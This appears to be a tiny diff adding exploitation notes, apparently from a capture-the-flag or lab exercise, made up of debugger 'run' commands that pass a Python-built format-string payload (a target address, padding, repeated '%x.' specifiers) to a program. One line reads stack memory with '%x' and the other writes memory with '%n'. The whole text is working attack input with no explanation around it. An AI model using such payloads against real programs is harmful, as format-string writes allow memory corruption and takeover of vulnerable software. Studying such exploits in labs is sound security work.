@@ -1,0 +1,4 @@
+Padding to last mem dump
+run `python -c 'print "\x38\x96\x04\x08"+"AAABB"+"%x."*143'`%x
+Write
+run `python -c 'print "\x38\x96\x04\x08"+"AAABB"+"%x."*143'`%n
